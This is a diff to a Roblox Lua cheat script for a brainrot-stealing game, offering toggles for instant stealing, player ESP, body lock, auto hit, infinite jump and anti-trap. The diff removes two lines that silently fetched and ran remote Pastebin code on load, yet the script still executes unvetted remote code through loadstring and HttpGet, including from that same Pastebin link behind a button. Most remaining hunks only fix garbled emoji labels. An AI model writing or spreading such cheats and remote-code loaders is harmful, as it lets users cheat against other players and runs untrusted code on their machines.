@@ -1,16 +1,3 @@
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
-
--- Auto-run external scripts on load
-pcall(function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/qrFryUJ2",true))()
-end)
-
-pcall(function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/8nMHjrYw", true))()
-end)
-
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 -- Create the main window
@@ -269,7 +256,7 @@ end
 end)
 
 -- UI Setup
-local MainTab = Window:CreateTab("ðŸŽ¯ Main", 6034818371)
+local MainTab = Window:CreateTab("🎯 Main", 6034818371)
 -- Below your Rayfield window and MainTab setup
 local autoSwordEnabled = false
 local lastUsed = 0
@@ -280,7 +267,7 @@ local LocalPlayer = Players.LocalPlayer
 
 -- Create the toggle
 MainTab:CreateToggle({
-Name = "ðŸ—¡ï¸Knock Back Arua Rainbow Sword",
+Name = "🗡️Knock Back Arua Rainbow Sword",
 CurrentValue = false,
 Callback = function(enabled)
 autoSwordEnabled = enabled
@@ -363,7 +350,7 @@ local button = Instance.new("TextButton", container)
 button.Size = UDim2.new(0.9, 0, 0, 40)
 button.Position = UDim2.new(0.05, 0, 0, 40)
 button.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-button.Text = "ðŸš¨ Insta Steal"
+button.Text = "🚨 Insta Steal"
 button.Font = Enum.Font.GothamBold
 button.TextColor3 = Color3.fromRGB(255, 100, 100)
 button.TextScaled = true
@@ -535,7 +522,7 @@ end)
 -- Replace your CreateButton with CreateToggle:
 
 MainTab:CreateToggle({
-	Name = "âš¡ï¸Kens Instant Steal",
+	Name = "⚡️Kens Instant Steal",
 	CurrentValue = false,
 	Flag = "KensInstantStealToggle", -- optional unique id
 	Callback = function(state)
@@ -569,7 +556,7 @@ if nearest and dist <= 17 then
 local targetHRP = nearest.Character:FindFirstChild("HumanoidRootPart")
 hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(targetHRP.Position.X, hrp.Position.Y, targetHRP.Position.Z))
 
--- Equip Ã¢â€ â€™ Activate Ã¢â€ â€™ Unequip sword
+-- Equip â†’ Activate â†’ Unequip sword
 if tick() - lastUsed >= 1 then
 for _, tool in ipairs(backpack:GetChildren()) do
 if tool:IsA("Tool") and tool.Name:match("Sword$") then
@@ -600,7 +587,7 @@ local LocalPlayer = Players.LocalPlayer
 
 -- Create the toggle button in MainTab
 MainTab:CreateToggle({
-Name = "ðŸŽ¯Body Lock Nearby Players",
+Name = "🎯Body Lock Nearby Players",
 CurrentValue = false,
 Flag = "BodyLockToggle",
 Callback = function(state)
@@ -686,7 +673,7 @@ end)
 
 --// UI Toggles (Connect to your MainTab)
 MainTab:CreateToggle({
-	Name = "ðŸ•Šï¸ Infinite Jump",
+	Name = "🕊️ Infinite Jump",
 	CurrentValue = false,
 	Callback = function(state)
 		infiniteJumpEnabled = state
@@ -694,7 +681,7 @@ MainTab:CreateToggle({
 })
 
 MainTab:CreateToggle({
-	Name = "ðŸƒâ€â™‚ï¸ Jump Boost",
+	Name = "🏃‍♂️ Jump Boost",
 	CurrentValue = false,
 	Callback = function(state)
 		jumpBoostEnabled = state
@@ -783,10 +770,10 @@ local function createFuturisticButton(text)
 end
 
 --// Buttons
-local upButton = createFuturisticButton("â¬† Up")
+local upButton = createFuturisticButton("⬆ Up")
 upButton.Parent = mainFrame
 
-local downButton = createFuturisticButton("â¬‡ Down")
+local downButton = createFuturisticButton("⬇ Down")
 downButton.Parent = mainFrame
 
 --// Variables
@@ -844,7 +831,7 @@ downButton.MouseButton1Click:Connect(disableCollisionTemporarily)
 
 --// Create Toggle Button in MainTab
 MainTab:CreateToggle({
-    Name = "ðŸ› ï¸ Up Down Steal Gui(PATCHED)",
+    Name = "🛠️ Up Down Steal Gui(PATCHED)",
     CurrentValue = false,
     Callback = function(enabled)
         screenGui.Enabled = enabled
@@ -1079,7 +1066,7 @@ end)
 
 -- ADD TO 'MainTab'
 MainTab:CreateButton({
-	Name = "âš¡ï¸Open Boost UI",
+	Name = "⚡️Open Boost UI",
 	Callback = function()
 		screenGui.Enabled = not screenGui.Enabled
 	end,
@@ -1087,7 +1074,7 @@ MainTab:CreateButton({
 
 -- Add the toggle in MainTab
 MainTab:CreateToggle({
-Name = "ðŸ‘‹Auto Hit",
+Name = "👋Auto Hit",
 CurrentValue = false,
 Flag = "AutoActivateTools",
 Callback = function(value)
@@ -1095,8 +1082,8 @@ autoActivateEnabled = value
 end
 })
 
-local ShopTab = Window:CreateTab("ðŸ›’ Shop", 6034818371)
-local EspTab = Window:CreateTab("ðŸ‘€ ESP", 6034818371)
+local ShopTab = Window:CreateTab("🛒 Shop", 6034818371)
+local EspTab = Window:CreateTab("👀 ESP", 6034818371)
 
 local activeLockTimeEsp = false
 local lteInstances = {}
@@ -1179,7 +1166,7 @@ end
 
 -- Create toggle but disable turning off once on
 toggleButton = EspTab:CreateToggle({
-Name = "ðŸ”’LockTime ESP",
+Name = "🔒LockTime ESP",
 CurrentValue = false,
 Callback = function(enabled)
 if enabled then
@@ -1266,9 +1253,9 @@ end
 table.clear(ESPObjects)
 end
 
--- Ã°Å¸Å½â€ºÃ¯Â¸Â Add toggle to your GUI tab
+-- ðŸŽ›ï¸ Add toggle to your GUI tab
 EspTab:CreateToggle({
-Name = "ðŸ“‡Player Name ESP",
+Name = "📇Player Name ESP",
 CurrentValue = false,
 Flag = "NameESP",
 Callback = function(state)
@@ -1321,7 +1308,7 @@ local function createGodESP(model)
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 1, 0)
     label.BackgroundTransparency = 1
-    label.Text = "Ã°Å¸Â§  " .. model.Name
+    label.Text = "ðŸ§  " .. model.Name
     label.TextColor3 = Color3.fromRGB(0, 170, 255) -- bright blue
     label.TextStrokeTransparency = 0
     label.TextStrokeColor3 = Color3.new(0, 0, 0)
@@ -1361,7 +1348,7 @@ end)
 
 -- Replace 'EspTab' with your actual Rayfield tab variable
 EspTab:CreateToggle({
-    Name = "â˜ ï¸ Brainrot God Esp",
+    Name = "☠️ Brainrot God Esp",
     CurrentValue = false,
     Flag = "BrainrotGodESP",
     Callback = function(state)
@@ -1412,7 +1399,7 @@ local function createSecretESP(model)
     local label = Instance.new("TextLabel")
     label.Size = UDim2.new(1, 0, 1, 0)
     label.BackgroundTransparency = 1
-    label.Text = "Ã°Å¸Â¤Â« " .. model.Name
+    label.Text = "ðŸ¤« " .. model.Name
     label.TextColor3 = Color3.fromRGB(255, 128, 0)
     label.TextStrokeTransparency = 0
     label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
@@ -1452,7 +1439,7 @@ end)
 
 -- Replace 'EspTab' with your actual Rayfield tab variable
 EspTab:CreateToggle({
-    Name = "ðŸ¤«Secret Brainrot Esp",
+    Name = "🤫Secret Brainrot Esp",
     CurrentValue = false,
     Flag = "SecretBrainrotESP",
     Callback = function(state)
@@ -1464,9 +1451,9 @@ EspTab:CreateToggle({
     end,
 })
 
-local UtilsTab = Window:CreateTab("ðŸ› ï¸ Utils", 6034818371)
+local UtilsTab = Window:CreateTab("🛠️ Utils", 6034818371)
 
--- Ã°Å¸Å¸Â¥ Then add the rest (GUI logic, etc.)
+-- ðŸŸ¥ Then add the rest (GUI logic, etc.)
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -1494,7 +1481,7 @@ leaveButton.MouseButton1Click:Connect(function()
 	player:Kick("You chose to leave the game.")
 end)
 
--- Ã°Å¸â€Ëœ Toggle to control the Leave GUI
+-- ðŸ”˜ Toggle to control the Leave GUI
 UtilsTab:CreateToggle({
 	Name = "Toggle Leave GUI",
 	CurrentValue = false,
@@ -1684,7 +1671,7 @@ UtilsTab:CreateToggle({
 })
 
 MainTab:CreateToggle({
-Name = "ðŸ‘»Show Invisible Players", 
+Name = "👻Show Invisible Players", 
 CurrentValue = visibilityEnabled, 
 Flag = "VisibilityToggle",
 Callback = function(s)
@@ -1716,14 +1703,14 @@ end
 })
 
 MainTab:CreateButton({
-Name = "ðŸ¥·Steal Tween gui",
+Name = "🥷Steal Tween gui",
 Callback = function()
 loadstring(game:HttpGet("https://pastebin.com/raw/qrFryUJ2",true))()
 end,
 })
 
 MainTab:CreateToggle({
-Name = "ðŸª¤Anti Trap", 
+Name = "🪤Anti Trap", 
 CurrentValue = false, 
 Flag = "AntiTrapToggle",
 Callback = function(s) 
@@ -1733,21 +1720,21 @@ end
 })
 
 MainTab:CreateToggle({
-Name = "ðŸAuto Activate Medusa's Head", 
+Name = "🐍Auto Activate Medusa's Head", 
 CurrentValue = false, 
 Flag = "AutoMedusaToggle",
 Callback = function(s) medusaEnabled=s end
 })
 
 MainTab:CreateToggle({
-Name = "ðŸ”«Bring Nearby Sentry To Destroy",
+Name = "🔫Bring Nearby Sentry To Destroy",
 CurrentValue = false,
 Callback = function(s) sentryActive = s end
 })
 
 -- Add ShopNPCCash toggle
 MainTab:CreateToggle({
-Name = "ðŸ›’Bring The Shop To You",
+Name = "🛒Bring The Shop To You",
 CurrentValue = false,
 Callback = function(s)
 shopNPCCashActive = s
@@ -1998,7 +1985,7 @@ local brainrotGods = {
 
 local notifiedModels = {}
 
--- âœ… Only keep player count check
+-- ✅ Only keep player count check
 local function isValidPlayerCount()
     local count = #Players:GetPlayers()
     return count >= 3 and count <= 8
